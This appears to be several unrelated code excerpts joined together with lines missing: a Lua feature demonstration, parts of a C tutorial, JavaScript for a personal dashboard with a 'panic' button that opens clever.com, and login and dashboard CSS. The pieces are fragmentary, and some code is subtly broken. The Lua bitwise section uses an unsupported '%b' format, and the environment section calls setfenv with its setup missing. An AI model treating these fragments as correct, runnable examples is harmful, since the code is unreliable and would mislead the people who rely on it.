```lua
  1: --[[
  2:     MASSIVE LUA SCRIPT DEMONSTRATION
  3:     This script showcases various Lua features and programming techniques
  4: --]]
  5: 
  6: -----------------------
  7: -- 1. BASIC VARIABLES --
  8: -----------------------
  9: 
 10: local nilValue = nil
 11: local booleanValue = true
 12: local numberValue = 42
 13: local floatValue = 3.14159
 14: local stringValue = "Hello, Lua!"
 15: local longString = [[
 16: This is a long string
 17: that spans multiple lines
 18: and preserves all formatting
 19: ]]
 20: 
 21: print("Basic values:")
 22: print("Boolean:", booleanValue)
 23: print("Number:", numberValue)
 24: print("Float:", floatValue)
 25: print("String:", stringValue)
 26: print("Long string:", longString)
 27: 
 28: -------------------------
 29: -- 2. TABLE OPERATIONS --
 30: -------------------------
 31: 
 32: -- Array-like table
 33: local arrayTable = {10, 20, 30, 40, 50}
 34: 
 35: -- Dictionary-like table
 36: local dictTable = {
 37:     name = "Lua Script",
 38:     version = 5.4,
 39:     awesome = true
 40: }
 41: 
 42: -- Mixed table
 43: local mixedTable = {
 44:     "apple", "banana",
 45:     color = "yellow",
 46:     count = 2,
 47:     "cherry"
 48: }
 49: 
 50: -- Table with table values
 51: local nestedTable = {
 52:     person = {
 53:         name = "Alice",
 54:         age = 30,
 55:         address = {
 56:             street = "123 Main St",
 57:             city = "Luatown"
 58:         }
 59:     },
 60:     scores = {95, 88, 76}
 61: }
 62: 
 63: print("\nTable operations:")
 64: print("Array table length:", #arrayTable)
 65: print("Dict table name:", dictTable.name)
 66: print("Mixed table [1]:", mixedTable[1])
 67: print("Mixed table color:", mixedTable.color)
 68: print("Nested table city:", nestedTable.person.address.city)
 69: 
 70: -- Table iteration
 71: print("\nArray table items:")
 72: for i, v in ipairs(arrayTable) do
 73:     print(i, v)
 74: end
 75: 
 76: print("\nDict table items:")
 77: for k, v in pairs(dictTable) do
 78:     print(k, v)
 79: end
 80: 
 81: ------------------------
 82: -- 3. CONTROL STRUCTURES --
 83: ------------------------
 84: 
 85: -- If-elseif-else
 86: local temperature = 25
 87: print("\nTemperature analysis:")
 88: if temperature > 30 then
 89:     print("It's hot!")
 90: elseif temperature > 20 then
 91:     print("It's warm.")
 92: elseif temperature > 10 then
 93:     print("It's cool.")
 94: else
 95:     print("It's cold!")
 96: end
 97: 
 98: -- While loop
 99: local counter = 5
100: print("\nCountdown:")
101: while counter > 0 do
102:     print(counter)
103:     counter = counter - 1
104: end
105: 
106: -- Repeat until (do-while)
107: local x = 1
108: print("\nRepeat until:")
109: repeat
110:     print("x is", x)
111:     x = x * 2
112: until x > 10
113: 
114: -- Numeric for loop
115: print("\nMultiplication table (5):")
116: for i = 1, 10 do
117:     print(string.format("5 x %d = %d", i, 5 * i))
118: end
119: 
120: -- Generic for loop with pairs
121: print("\nMixed table contents:")
122: for k, v in pairs(mixedTable) do
123:     print(k, v)
124: end
125: 
126: ---------------------
127: -- 4. FUNCTIONS --
128: ---------------------
129: 
130: -- Basic function
131: local function greet(name)
132:     return "Hello, " .. name .. "!"
133: end
134: 
135: -- Function with multiple return values
136: local function calculate(x, y)
137:     return x + y, x - y, x * y, x / y
138: end
139: 
140: -- Variadic function
141: local function sum(...)
142:     local total = 0
143:     for i, v in ipairs({...}) do
144:         total = total + v
145:     end
146:     return total
147: end
148: 
149: -- Recursive function
150: local function factorial(n)
151:     if n <= 1 then
152:         return 1
153:     else
154:         return n * factorial(n - 1)
155:     end
156: end
157: 
158: -- Function as table value
159: local mathUtils = {
160:     square = function(x) return x * x end,
161:     cube = function(x) return x * x * x end
162: }
163: 
164: print("\nFunction examples:")
165: print(greet("World"))
166: local a, b, c, d = calculate(10, 2)
167: print("Calculate:", a, b, c, d)
168: print("Sum of 1-5:", sum(1, 2, 3, 4, 5))
169: print("Factorial of 5:", factorial(5))
170: print("Square of 9:", mathUtils.square(9))
171: print("Cube of 3:", mathUtils.cube(3))
172:

174: -- 5. METATABLES --
175: ------------------------
176: 
177: -- Create a table with metatable for operator overloading
178: local Vector = {}
179: Vector.__index = Vector
180: 
181: function Vector.new(x, y)
182:     local v = {x = x or 0, y = y or 0}
183:     setmetatable(v, Vector)
184:     return v
185: end
186: 
187: function Vector.__add(a, b)
188:     return Vector.new(a.x + b.x, a.y + b.y)
189: end
190: 
191: function Vector.__tostring(v)
192:     return string.format("Vector(%f, %f)", v.x, v.y)
193: end
194: 
195: local v1 = Vector.new(1, 2)
196: local v2 = Vector.new(3, 4)
197: local v3 = v1 + v2
198: 
199: print("\nMetatable examples:")
200: print("v1:", v1)
201: print("v2:", v2)
202: print("v1 + v2:", v3)
203: 
204: -- Index metamethod example
205: local defaultTable = setmetatable({}, {
206:     __index = function(t, k)
207:         return "Default value for " .. tostring(k)
208:     end
209: })
210: 
211: print("\nDefault table value:", defaultTable.non_existent_key)
212: 
213: -----------------------
214: -- 6. COROUTINES --
215: -----------------------
216: 
217: local function producer()
218:     local items = {"apple", "banana", "cherry", "date"}
219:     for i, item in ipairs(items) do
220:         print("[Producer] sending:", item)
221:         coroutine.yield(item)
222:     end
223:     return "done"
224: end
225: 
226: local consumer = coroutine.create(producer)
227: 
228: print("\nCoroutine example:")
229: while true do
230:     local success, value = coroutine.resume(consumer)
231:     if not success then
232:         print("[Consumer] Error:", value)
233:         break
234:     end
235:     if coroutine.status(consumer) == "dead" then
236:         print("[Consumer] Received:", value)
237:         break
238:     end
239:     print("[Consumer] received:", value)
240: end
241: 
242: ------------------------
243: -- 7. FILE I/O --
244: ------------------------
245: 
246: -- Write to a file
247: local file = io.open("test.txt", "w")
248: if file then
249:     file:write("This is line 1\n")
250:     file:write("This is line 2\n")
251:     file:write(string.format("The value is %d\n", numberValue))
252:     file:close()
253:     print("\nFile written successfully")
254: else
255:     print("Failed to open file for writing")
256: end
257: 
258: -- Read from a file
259: local file = io.open("test.txt", "r")
260: if file then
261:     print("\nFile contents:")
262:     for line in file:lines() do
263:         print(line)
264:     end
265:     file:close()
266: else
267:     print("Failed to open file for reading")
268: end
269: 
270: -------------------------
271: -- 8. ERROR HANDLING --
272: -------------------------
273: 
274: local function riskyOperation(x)
275:     if x < 0 then
276:         error("Negative values not allowed")
277:     end
278:     return math.sqrt(x)
279: end
280: 
281: print("\nError handling:")
282: local status, result = pcall(riskyOperation, 16)
283: if status then
284:     print("Result:", result)
285: else
286:     print("Error:", result)
287: end
288: 
289: status, result = pcall(riskyOperation, -4)
290: if status then
291:     print("Result:", result)
292: else
293:     print("Error:", result)
294: end
295: 
296: -- xpcall with error handler
297: local function errorHandler(err)
298:     return "Caught error: " .. tostring(err)
299: end
300: 
301: status, result = xpcall(function() return riskyOperation(-9) end, errorHandler)
302: print("xpcall result:", result)
303: 
304: -------------------------
305: -- 9. MODULES --
306: -------------------------
307: 
308: -- Create a simple module
309: local mymodule = {}
310: 
311: function mymodule.sayHello()
312:     print("Hello from the module!")
313: end
314: 
315: function mymodule.addNumbers(a, b)
316:     return a + b
317: end
318: 
319: -- Use the module

321: mymodule.sayHello()
322: print("Module add:", mymodule.addNumbers(7, 3))
323: 
324: -------------------------
325: -- 10. ADVANCED TOPICS --
326: -------------------------
327: 
328: -- Closures
329: local function makeCounter()
330:     local count = 0
331:     return function()
332:         count = count + 1
333:         return count
334:     end
335: end
336: 
337: local counter1 = makeCounter()
338: local counter2 = makeCounter()
339: 
340: print("\nClosure counters:")
341: print("Counter1:", counter1())
342: print("Counter1:", counter1())
343: print("Counter2:", counter2())
344: print("Counter1:", counter1())
345: 
346: -- Tail calls
347: local function tailCallDemo(n)
348:     if n <= 0 then
349:         return "Done"
350:     end
351:     print("Tail call:", n)
352:     return tailCallDemo(n - 1)
353: end
354: 
355: print("\nTail call example:")
356: print(tailCallDemo(3))
357: 
358: -- Bitwise operations (Lua 5.3+)
359: if _VERSION >= "Lua 5.3" then
360:     print("\nBitwise operations:")
361:     local a = 0b1100
362:     local b = 0b1010
363:     print(string.format("a AND b = %04b", a & b))
364:     print(string.format("a OR b  = %04b", a | b))
365:     print(string.format("a XOR b = %04b", a ~ b))
366:     print(string.format("NOT a   = %04b", ~a & 0xF))
367:     print(string.format("a << 1  = %04b", a << 1))
368:     print(string.format("b >> 1  = %04b", b >> 1))
369: end
370: 
371: -- Environment manipulation

379: 
380: -- Restore original environment
381: setfenv(1, _G)
382: print("Secret in global:", secret or "nil")
383: 
384: -------------------------
385: -- 11. FINAL OUTPUT --

387: 
388: print("\nScript execution complete!")
389: print("Lua version:", _VERSION)
390: print("Operating system:", os.getenv("OS") or "Unknown")
391: print("Current time:", os.date("%Y-%m-%d %H:%M:%S"))
```

```cpp
219: // A recursive function to calculate factorial

221: int factorial(int n) {
222:     if (n == 0 || n == 1) { // Base case to stop recursion
223:         return 1;
224:     } else {
225:         return n * factorial(n - 1); // Function calls itself
226:     }
227: }

317:             break; // 'break' is crucial to exit the switch
318:         case 2:
319:             printf("You chose option 2.\n");
320:             break;
321:         default:
322:             printf("Invalid choice.\n");
323:             break;
324:     }
325: 
326:     // for loop
327:     printf("For loop (0 to 4): ");
328:     for (int i = 0; i < 5; i++) {
329:         printf("%d ", i);
330:     }
331:     printf("\n");
332: 
333:     // while loop
334:     printf("While loop (countdown 3 to 1): ");
335:     int countdown = 3;
336:     while (countdown > 0) {
337:         printf("%d... ", countdown);
338:         countdown--;
339:     }
340:     printf("Liftoff!\n");
341: 
342:     // do-while loop (executes at least once)
343:     int x = 5;
344:     printf("Do-While: ");
345:     do {
346:         printf("%d ", x);
347:         x++;
348:     } while (x < 5); // Condition is false, but body ran once.
349:     printf("\n\n");
350: }
351: 
352: void demonstrate_arrays_and_pointers() {
353:     printf("--- 3. Arrays, Strings, and Pointers ---\n");
354: 
355:     // Array
356:     int numbers[] = {10, 20, 30, 40, 50}; // Size inferred from initializer
357:     int array_size = sizeof(numbers) / sizeof(numbers[0]); // Calculate number of elements
358: 
359:     printf("Array elements: ");
360:     for (int i = 0; i < array_size; i++) {
361:         printf("%d ", numbers[i]);
362:     }
363:     printf("\n");
364: 
365:     // String (is an array of chars, terminated with null character '\\0')
366:     char greeting[] = "Hello"; // Automatically adds '\0'
367:     printf("String: %s (Length: %lu)\n", greeting, strlen(greeting));
368: 
369:     // Pointers - variables that store memory addresses
370:     int num = 42;
371:     int *num_pointer = &num; // & gets the address of 'num'
372: 
373:     printf("Value of num: %d\n", num);
374:     printf("Address of num: %p\n", (void*)&num); // %p prints pointers
375:     printf("Value of num_pointer: %p\n", (void*)num_pointer);
376:     printf("Value pointed to by num_pointer: %d\n\n", *num_pointer); // * dereferences the pointer
377: }
378: 
379: void demonstrate_structures() {
380:     printf("--- 4. Structures (Custom Types) ---\n");
381: 
382:     // Declare and initialize a struct
383:     struct Book book1 = {"The C Programming Language", "K&R", 1978, 49.99};
384:     struct Book book2;
385: 
386:     // Assign values to struct members using the dot operator
387:     strcpy(book2.title, "C: The Complete Reference");
388:     strcpy(book2.author, "Herbert Schildt");
389:     book2.year = 2017;
390:     book2.price = 35.50;
391: 
392:     // Create an array of structs
393:     struct Book library[MAX_BOOKS] = {book1, book2};
394: 
395:     // Print the library catalog
396:     printf("Library Catalog:\n");
397:     for (int i = 0; i < 2; i++) { // Only loop through the 2 books we filled
398:         printf("Book %d: %s by %s (%d). $%.2f\n",
399:                i + 1,
400:                library[i].title,
401:                library[i].author,
402:                library[i].year,
403:                library[i].price);
404:     }
405:     printf("\n");
406: }

408: void demonstrate_memory_allocation() {
409:     printf("--- 5. Dynamic Memory Allocation ---\n");
410: 
411:     int *dynamic_array;
412:     int size;
413: 
414:     printf("How many numbers do you want to store? ");
415:     scanf("%d", &size);
416: 
417:     // Allocate memory on the heap using malloc
418:     // sizeof(*dynamic_array) is the size of what the pointer points to (an int)
419:     dynamic_array = (int *)malloc(size * sizeof(*dynamic_array));
420: 
421:     // Check if allocation succeeded
422:     if (dynamic_array == NULL) {
423:         printf("Memory allocation failed! Exiting.\n");
424:         exit(1); // Exit the program with an error code
425:     }
426: 
427:     printf("Enter %d numbers:\n", size);
428:     for (int i = 0; i < size; i++) {
429:         printf("Number %d: ", i + 1);
430:         scanf("%d", &dynamic_array[i]); // & is needed as scanf expects an address
431:     }
432: 
433:     printf("You entered: ");
434:     for (int i = 0; i < size; i++) {
435:         printf("%d ", dynamic_array[i]);
436:     }
437:     printf("\n");
438: 
439:     // Demonstrate the recursive factorial function
440:     printf("Factorial of %d (calculated recursively) is %d\n", size, factorial(size));
441: 
442:     // CRITICAL: Free the allocated memory to avoid memory leaks
443:     free(dynamic_array);
444:     printf("Dynamically allocated memory has been freed.\n\n");
445: }
446: 
447: // A recursive function to calculate factorial
448: // factorial(5) = 5 * 4 * 3 * 2 * 1
449: int factorial(int n) {
450:     if (n == 0 || n == 1) { // Base case to stop recursion
451:         return 1;
452:     } else {
453:         return n * factorial(n - 1); // Function calls itself
454:     }
455: }
```

```
1079:   <script>
1080:     // Dashboard functionality object
1081:     const dashboard = {
1082:       // Initialize all dashboard functionality
1083:       init: function() {
1084:         this.initSessionTimer();
1085:         this.initClock();
1086:         this.generateCalendar();
1087:         this.initThemeToggle();
1088:         this.initButtons();
1089:         this.initCanvas();
1090:         this.initPanels();
1091:         this.initQuickBar();
1092:       },
1093:       
1094:       // Initialize session timer
1095:       initSessionTimer: function() {
1096:         let sessionSeconds = 0;
1097:         function formatTime(seconds) {
1098:           const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
1099:           const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
1100:           const secs = String(seconds % 60).padStart(2, '0');
1101:           return `${hrs}:${mins}:${secs}`;
1102:         }
1103:         
1104:         function updateSessionTime() {
1105:           sessionSeconds++;
1106:           document.getElementById('sessionTime').innerText = `â³ Session Time: ${formatTime(sessionSeconds)}`;
1107:         }
1108:         
1109:         updateSessionTime();
1110:         setInterval(updateSessionTime, 1000);
1111:       },
1112:       
1113:       // Initialize real-time clock
1114:       initClock: function() {
1115:         function updateClock() {
1116:           const now = new Date();
1117:           const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
1118:           const timeStr = now.toLocaleTimeString(undefined, options);
1119:           const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });
1120: 
1121:           document.getElementById('realTimeClock').innerText = 'ðŸ•’ ' + timeStr;
1122:           document.getElementById('realDate').innerText = 'ðŸ“… ' + dateStr;
1123:         }
1124:         
1125:         updateClock();
1126:         setInterval(updateClock, 1000);
1127:       },
1128:       
1129:       // Generate calendar
1130:       generateCalendar: function() {
1131:         const calendar = document.getElementById('calendar');
1132:         calendar.innerHTML = ''; 
1133:         const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
1134:         days.forEach(day => {
1135:           const div = document.createElement('div');
1136:           div.innerText = day;
1137:           calendar.appendChild(div);
1138:         });
1139: 
1140:         const date = new Date();
1141:         const year = date.getFullYear();
1142:         const month = date.getMonth();
1143:         const today = date.getDate();
1144: 
1145:         const firstDay = new Date(year, month, 1).getDay();
1146:         const lastDate = new Date(year, month + 1, 0).getDate();
1147: 
1148:         for (let i = 0; i < firstDay; i++) {
1149:           const empty = document.createElement('div');
1150:           calendar.appendChild(empty);
1151:         }
1152: 
1153:         for (let i = 1; i <= lastDate; i++) {
1154:           const cell = document.createElement('div');
1155:           cell.innerText = i;
1156:           if (i === today) cell.classList.add('today');
1157:           calendar.appendChild(cell);
1158:         }
1159:       },
1160:       
1161:       // Initialize theme toggle
1162:       initThemeToggle: function() {
1163:         const themeBtn = document.getElementById('themeToggle');
1164:         themeBtn.addEventListener('click', () => {
1165:           document.body.classList.toggle('light-theme');
1166:           if(document.body.classList.contains('light-theme')){
1167:             themeBtn.innerText = 'â˜€ï¸ Light Mode';
1168:           } else {
1169:             themeBtn.innerText = 'ðŸŒ™ Dark Mode';
1170:           }
1171:         });
1172:       },
1173:       
1174:       // Initialize buttons
1175:       initButtons: function() {
1176:         document.getElementById('panicBtn').addEventListener('click', () => {
1177:           window.open('https://clever.com', '_blank');
1178:         });
1179: 
1180:         document.getElementById('restartBtn').addEventListener('click', () => {
1181:           if(confirm('Are you sure you want to kill the page (restart)?')) {
1182:             document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Restart to continue.</div>`;
1183:           }
1184:         });
1185: 
1186:         document.getElementById('fixIssuesBtn').addEventListener('click', () => {
1187:           alert('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!');
1188:         });
1189:         
1190:         document.getElementById('fullScreenBtn').addEventListener('click', () => {
1191:           if (!document.fullscreenElement) {
1192:             document.documentElement.requestFullscreen().catch(err => {
1193:               alert(`Error attempting to enable full-screen mode: ${err.message}`);
1194:             });
1195:           } else {
1196:             document.exitFullscreen();
1197:           }
1198:         });
1199:         
1200:         let zoomLevel = 1;
1201:         const zoomStep = 0.1;
1202:         const minZoom = 0.5;
1203:         const maxZoom = 2;
1204: 
1205:         document.getElementById('zoomInBtn').addEventListener('click', () => {
1206:           if (zoomLevel < maxZoom) {
1207:             zoomLevel += zoomStep;
1208:             document.body.style.zoom = zoomLevel;
1209:           }
1210:         });
1211: 
1212:         document.getElementById('zoomOutBtn').addEventListener('click', () => {
1213:           if (zoomLevel > minZoom) {
1214:             zoomLevel -= zoomStep;
1215:             document.body.style.zoom = zoomLevel;
1216:           }
1217:         });
1218:       },
1219:       
1220:       // Initialize canvas
1221:       initCanvas: function() {
1222:         const notesBtn = document.getElementById('notesBtn');
1223:         const canvasContainer = document.getElementById('canvasContainer');
1224:         const mainGrid = document.getElementById('mainGrid');
1225: 
1226:         notesBtn.addEventListener('click', () => {
1227:           mainGrid.style.display = 'none';
1228:           canvasContainer.style.display = 'block';
1229:         });
1230: 
1231:         document.getElementById('closeCanvasBtn').addEventListener('click', () => {
1232:           canvasContainer.style.display = 'none';
1233:           mainGrid.style.display = 'flex';
1234:         });
1235: 
1236:         const clearCanvasBtn = document.getElementById('clearCanvasBtn');
1237: 
1238:         const canvas = document.getElementById('notesCanvas');
1239:         const ctx = canvas.getContext('2d');
1240: 
1241:         ctx.fillStyle = '#fff';
1242:         ctx.fillRect(0, 0, canvas.width, canvas.height);
1243: 
1244:         let drawing = false;
1245: 
1246:         function getPos(evt) {
1247:           const rect = canvas.getBoundingClientRect();
1248:           return {
1249:             x: (evt.clientX || evt.touches[0].clientX) - rect.left,
1250:             y: (evt.clientY || evt.touches[0].clientY) - rect.top
1251:           };
1252:         }
1253: 
1254:         canvas.addEventListener('mousedown', (e) => {
1255:           drawing = true;
1256:           const pos = getPos(e);
1257:           ctx.beginPath();
1258:           ctx.moveTo(pos.x, pos.y);
1259:           e.preventDefault();
1260:         });
1261: 
1262:         canvas.addEventListener('touchstart', (e) => {
1263:           drawing = true;
1264:           const pos = getPos(e);
1265:           ctx.beginPath();
1266:           ctx.moveTo(pos.x, pos.y);
1267:           e.preventDefault();
1268:         });
1269: 
1270:         canvas.addEventListener('mousemove', (e) => {
1271:           if (!drawing) return;
1272:           const pos = getPos(e);
1273:           ctx.lineTo(pos.x, pos.y);
1274:           ctx.strokeStyle = '#ff914d';
1275:           ctx.lineWidth = 2;
1276:           ctx.lineCap = 'round';
```

```html
 230:     body.light-theme .error-log-entry,
 231:     body.light-theme .announcement-bar,
 232:     body.light-theme .reset-popup .reset-field { /* Added announcement-bar and reset elements for light theme */
 233:         background-color: var(--primary-bg) !important; /* Use !important to ensure override */
 234:         color: var(--text-primary) !important;
 235:         border-color: var(--border-color) !important;
 236:     }
 237:     body.light-theme .important-date-item {
 238:         border-left-color: var(--accent-secondary) !important;
 239:     }
 240:     body.light-theme .click-button,
 241:     body.light-theme .reset-popup button { /* Added reset button for light theme */
 242:         background: var(--accent-color) !important;
 243:         color: white !important;
 244:     }
 245:     body.light-theme .click-button:hover,
 246:     body.light-theme .reset-popup button:hover { /* Added reset button hover for light theme */
 247:         background: var(--accent-secondary) !important;
 248:     }
 249:     body.light-theme .announcement-content { /* Added announcement-content for light theme */
 250:         color: var(--accent-color) !important;
 251:     }
 252:     body.light-theme .reset-popup {
 253:       background: rgba(255, 255, 255, 0.98) !important; /* Lighter background for popup */
 254:       border-color: var(--accent-color) !important;
 255:       box-shadow: 0 0 30px rgba(0, 123, 255, 0.3) !important;
 256:     }
 257:     body.light-theme .reset-popup p {
 258:       color: var(--text-primary) !important;
 259:     }

 261: 
 262:     * {
 263:       box-sizing: border-box;
 264:       margin: 0;
 265:       padding: 0;
 266:     }
 267: 
 268:     body {
 269:       font-family: 'Roboto', sans-serif;
 270:       background: var(--primary-bg);
 271:       color: var(--text-primary);
 272:       overflow-x: hidden;
 273:       transition: background-color 0.3s ease, color 0.3s ease;
 274:     }
 275: 
 276:     /* Initialization Screen */
 277:     .init-screen {
 278:       position: fixed;
 279:       top: 0;
 280:       left: 0;
 281:       width: 100vw;
 282:       height: 100vh;
 283:       background: radial-gradient(circle at center, #1a1a2e, #16213e, #0f0f0f);
 284:       display: flex;
 285:       flex-direction: column;
 286:       justify-content: center;
 287:       align-items: center;
 288:       z-index: 9999;
 289:     }
 290: 
 291:     .rotating-cube {
 292:       width: 80px;
 293:       height: 80px;
 294:       position: relative;
 295:       transform-style: preserve-3d;
 296:       animation: rotateCube 2s infinite linear;
 297:       margin-bottom: 30px;
 298:     }
 299: 
 300:     .cube-face {
 301:       position: absolute;
 302:       width: 80px;
 303:       height: 80px;
 304:       background: linear-gradient(45deg, var(--accent-color), var(--accent-secondary));
 305:       border: 2px solid #fff;
 306:       opacity: 0.8;
 307:     }
 308: 
 309:     .cube-face.front { transform: rotateY(0deg) translateZ(40px); }
 310:     .cube-face.back { transform: rotateY(180deg) translateZ(40px); }
 311:     .cube-face.right { transform: rotateY(90deg) translateZ(40px); }
 312:     .cube-face.left { transform: rotateY(-90deg) translateZ(40px); }
 313:     .cube-face.top { transform: rotateX(90deg) translateZ(40px); }
 314:     .cube-face.bottom { transform: rotateX(-90deg) translateZ(40px); }
 315: 
 316:     @keyframes rotateCube {
 317:       0% { transform: rotateX(0deg) rotateY(0deg); }
 318:       100% { transform: rotateX(360deg) rotateY(360deg); }
 319:     }
 320: 
 321:     .init-text {
 322:       font-family: 'Orbitron', monospace;
 323:       font-size: 24px;
 324:       font-weight: 700;
 325:       background: linear-gradient(45deg, #ff4500, #ff0040);
 326:       background-size: 200% 200%;
 327:       -webkit-background-clip: text;
 328:       -webkit-text-fill-color: transparent;
 329:       animation: gradientShift 3s ease-in-out infinite;
 330:       text-align: center;
 331:     }
 332: 
 333:     @keyframes gradientShift {
 334:       0%, 100% { background-position: 0% 50%; }
 335:       50% { background-position: 100% 50%; }
 336:     }
 337: 
 338:     .code-rain {
 339:       position: absolute;
 340:       top: 0;
 341:       left: 0;
 342:       width: 100%;
 343:       height: 100%;
 344:       pointer-events: none;
 345:       opacity: 0.3;
 346:     }
 347: 
 348:     .code-char {
 349:       position: absolute;
 350:       color: var(--success-color);
 351:       font-family: 'Courier New', monospace;
 352:       font-size: 12px;
 353:       animation: fall 3s linear infinite;
 354:     }
 355: 
 356:     @keyframes fall {
 357:       0% { transform: translateY(-100vh); opacity: 1; }
 358:       100% { transform: translateY(100vh); opacity: 0; }
 359:     }
 360: 
 361:     /* Enhanced Login Styles */
 362:     .login-container {
 363:       min-height: 100vh;
 364:       background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
 365:       display: flex;
 366:       flex-direction: column;
 367:       justify-content: center;
 368:       align-items: center;
 369:       position: relative;
 370:     }

 372:     .login-quickbar {
 373:       position: fixed;
 374:       top: 0;
 375:       left: 0;
 376:       right: 0;
 377:       background: rgba(0, 0, 0, 0.9);
 378:       backdrop-filter: blur(10px);
 379:       padding: 10px 20px;
 380:       display: flex;
 381:       justify-content: space-between;
 382:       align-items: center;
 383:       z-index: 1000;
 384:       border-bottom: 1px solid var(--border-color);

 386: 
 387:     .login-quickbar button {
 388:       background: var(--accent-color);
 389:       color: white;
 390:       border: none;
 391:       padding: 8px 15px;
 392:       border-radius: 6px;
 393:       cursor: pointer;
 394:       font-size: 12px;

 396:       margin: 0 5px;

 398: 
 399:     .login-quickbar button:hover {
 400:       background: var(--accent-secondary);
 401:       transform: translateY(-2px);
 402:     }
 403: 
 404:     .panic-btn {

 408:     .login-box {
 409:       background: rgba(26, 26, 26, 0.95);
 410:       backdrop-filter: blur(15px);
 411:       border: 3px solid var(--accent-color);

 413:       box-shadow: 0 0 30px rgba(255, 69, 0, 0.5);

 416:       text-align: center;

 418:       margin-top: 60px;

 422:     .login-box.error-shake {

 424:     }
 425: 
 426:     @keyframes shake {
 427:       0%, 100% { transform: translateX(0); }
 428:       25% { transform: translateX(-10px); }
 429:       75% { transform: translateX(10px); }
 430:     }
 431: 
 432:     .login-box h2 {
 433:       font-family: 'Orbitron', monospace;
 434:       font-size: 28px;
 435:       font-weight: 900;
 436:       margin-bottom: 30px;

 438:       -webkit-background-clip: text;
 439:       -webkit-text-fill-color: transparent;

 442:     .input-group {
 443:       position: relative;
 444:       margin-bottom: 20px;
 445:     }

 447:     .login-box input {
 448:       width: 100%;
 449:       padding: 15px;
 450:       background: rgba(30, 30, 30, 0.8);
 451:       border: 2px solid var(--border-color);
 452:       color: white;
 453:       border-radius: 10px;
 454:       font-size: 16px;
 455:       transition: all 0.3s ease;
 456:     }
 457: 
 458:     .login-box input:focus {
 459:       border-color: var(--accent-color);
 460:       box-shadow: 0 0 15px rgba(255, 69, 0, 0.3);

 464:     .toggle-container {
 465:       display: flex;
 466:       align-items: center;
 467:       justify-content: space-between;

 469:       padding: 10px;

 474:     .toggle-switch {

 477:       height: 25px;

 503:     .submit-btn {

 523:     .time-date-box {
 524:       background: rgba(30, 30, 30, 0.8);

 535:       font-weight: 700;
 536:       color: var(--accent-color);

 545:     /* Dashboard Styles */
 546:     .dashboard {
 547:       min-height: 100vh;
 548:       background: var(--primary-bg);
 549:       padding: 20px;
 550:       display: none;
 551:     }
 552: 
 553:     .dashboard.active {
 554:       display: block;
 555:     }
 556: 
 557:     .dashboard-header {
 558:       background: linear-gradient(135deg, var(--accent-color), var(--accent-secondary));
 559:       padding: 20px 30px;
 560:       border-radius: 15px;

 568:     .dashboard-quickbar {

 572:       gap: 10px;

 575:       background: var(--secondary-bg);

 577:       border: 1px solid var(--border-color);
 578:       align-items: center; /* Align items vertically in quickbar */

 581:     /* Styles for the time displays within the search container */
 582:     .quickbar-time-info {
 583:         display: flex;
 584:         align-items: center;

 586:         font-size: 12px;

 589:         padding: 6px 10px; /* Add padding */
 590:         border-radius: 6px; /* Add border-radius */
 591:         border: 1px solid var(--border-color); /* Add border */
 592:         color: var(--text-primary); /* Ensure text color adapts */
 593:     }

 599:     }

 601:     .search-group { /* New container for search input and time displays */
 602:         display: flex;

 605:         flex-grow: 1; /* Allow it to grow, but respecting max-width */
 606:         max-width: 50%; /* Adjust based on desired layout balance */
 607:         min-width: 350px; /* Ensure minimum width for contents */
 608:     }
 609:     .search-container { /* This now just wraps the input and search button visually */
 610:       position: relative;

 612:       flex-grow: 1;

 614:     }
 615: 
 616:     .search-bar {
 617:       width: 100%;
 618:       padding: 10px 40px 10px 15px;
 619:       background: var(--primary-bg);
 620:       border: 2px solid var(--border-color);
 621:       border-radius: 25px;
 622:       color: white;
 623:       font-size: 14px;

 627:     .search-btn {

 629:       right: 5px;

 633:       border: none;
 634:       border-radius: 50%;
 635:       width: 30px;
 636:       height: 30px;
 637:       color: white;
 638:       cursor: pointer;
 639:       transition: all 0.3s ease;

 644: 
 645:     .quick-btn-group { /* New container for all buttons to the right */
 646:         display: flex;
 647:         flex-wrap: wrap;
 648:         gap: 10px;
 649:         justify-content: flex-end; /* Align buttons to the right within their group */
 650:     }
 651: 
 652:     .quick-btn {
 653:       background: var(--accent-color);
 654:       color: white;
 655:       border: none;
 656:       padding: 10px 15px;
 657:       border-radius: 8px;
 658:       cursor: pointer;
 659:       font-size: 12px;
 660:       transition: all 0.3s ease;
 661:       white-space: nowrap;
 662:     }
 663: 
 664:     .quick-btn:hover {
 665:       background: var(--accent-secondary);
 666:       transform: translateY(-2px);
 667:     }

 669:     .notification {
 670:       position: fixed;
 671:       top: 20px;
 672:       right: 20px;
 673:       background: var(--secondary-bg); /* Use theme background */
 674:       border: 2px solid var(--success-color); /* Accent border to signify its status */
 675:       color: var(--text-primary); /* Use theme text color */
 676:       padding: 15px 25px;
 677:       border-radius: 10px;
 678:       box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3); /* Adjust shadow for both themes */
 679:       z-index: 1000;
 680:       animation: slideIn 0.5s ease;

 682: 
 683:     @keyframes slideIn {
 684:       from { transform: translateX(100%); opacity: 0; }
 685:       to { transform: translateX(0); opacity: 1; }
 686:     }

 688:     .panels-grid {
 689:       display: grid;
 690:       grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
 691:       gap: 20px;
 692:       margin-bottom: 30px;
 693:       transition: opacity 0.3s ease-in-out;
 694:     }
 695: 
 696:     .panel {
 697:       background: var(--secondary-bg);
 698:       border: 1px solid var(--border-color);
 699:       border-radius: 15px;
 700:       padding: 20px;

 703:       resize: both;
 704:       overflow: auto;
 705:       min-height: 200px;

 711: 
 712:     .panel-header {
 713:       display: flex;
 714:       justify-content: space-between;
 715:       align-items: center;
 716:       margin-bottom: 15px;
 717:       padding-bottom: 10px;
 718:       border-bottom: 1px solid var(--border-color);

 720: 
 721:     .panel-title {
 722:       font-size: 18px;
 723:       font-weight: 700;
 724:       color: var(--accent-color);

 726:

 732:     .panel-btn {

 738:       height: 25px;
 739:       cursor: pointer;
 740:       font-size: 10px;
 741:       transition: all 0.3s ease;
 742:     }
 743: 
